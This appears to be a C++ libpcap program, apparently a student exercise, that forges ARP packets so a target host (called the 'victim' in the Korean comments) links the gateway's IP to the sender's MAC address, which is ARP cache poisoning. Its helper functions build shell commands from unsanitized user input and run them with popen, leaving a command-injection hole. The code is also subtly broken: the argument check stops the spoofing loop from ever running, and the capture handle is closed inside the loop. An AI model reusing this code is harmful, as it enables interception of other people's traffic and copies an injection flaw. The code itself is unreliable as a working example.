#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <iostream>
#include <fstream>
#include <sstream>
//#include <string>
//#include <vector>
#include <algorithm>
#include <cstdio>
#include <cstring>
#include <stdio.h>
using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp-test <interface>\n");
    printf("sample: send-arp-test wlan0\n");
}


string cmd(string command) {
 
    std::string result;
    char buffer[128];

    // 커맨드 실행 후 결과를 읽기 위해 popen 사용
    FILE* pipe = popen(command.c_str(), "r");
    if (!pipe) {
        return "Error: popen failed!";
    }

    while (!feof(pipe)) {
        if (fgets(buffer, 128, pipe) != nullptr) {
            result += buffer;
        }
    }

    pclose(pipe);

    // 개행 문자 제거
    if (!result.empty() && result.back() == '\n') {
        result.pop_back();
    }

    return result;
}

string getMymac(string inter) {
    string command = "ifconfig " + inter;

    string output = cmd(command);
    istringstream iss(output);
    string line;

    while (getline(iss, line)) {
        auto pos = line.find("ether ");
        if (pos != std::string::npos) {
            std::string macAddress = line.substr(pos + 6, 17);
            macAddress.erase(std::remove(macAddress.begin(), macAddress.end(), ':'), macAddress.end());
            return macAddress;
        }

    }
    return "";
}

string getVmac(string vip) {
    string command = "arp -n " + vip + " | awk '/" + vip + "/ {print $3}' ";
    //printf("%s", command);
    string output = cmd(command);
    return output;
}



int main(int argc, char* argv[]) {
    if (argc != 2) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, 0, 0, 0, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }
    string mymac = getMymac(argv[1]);


    for (int i = 2; i < argc; i=i+2) {
        EthArpPacket packet;
        string vmac = getVmac(argv[i]); //victim mac

        packet.eth_.dmac_ = Mac(vmac); //빅팀맥
        packet.eth_.smac_ = Mac(mymac); //내맥
        packet.eth_.type_ = htons(EthHdr::Arp);

        packet.arp_.hrd_ = htons(ArpHdr::ETHER);
        packet.arp_.pro_ = htons(EthHdr::Ip4);
        packet.arp_.hln_ = Mac::SIZE;
        packet.arp_.pln_ = Ip::SIZE;
        packet.arp_.op_ = htons(ArpHdr::Request);
        packet.arp_.smac_ = Mac(mymac); //내맥
        packet.arp_.sip_ = htonl(Ip(argv[i+1])); //게이트웨이ip
        packet.arp_.tmac_ = Mac(vmac); //샌더맥=빅팀
        packet.arp_.tip_ = htonl(Ip(argv[i])); //샌더ip=빅팀

        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        }

        pcap_close(handle);
    }

}

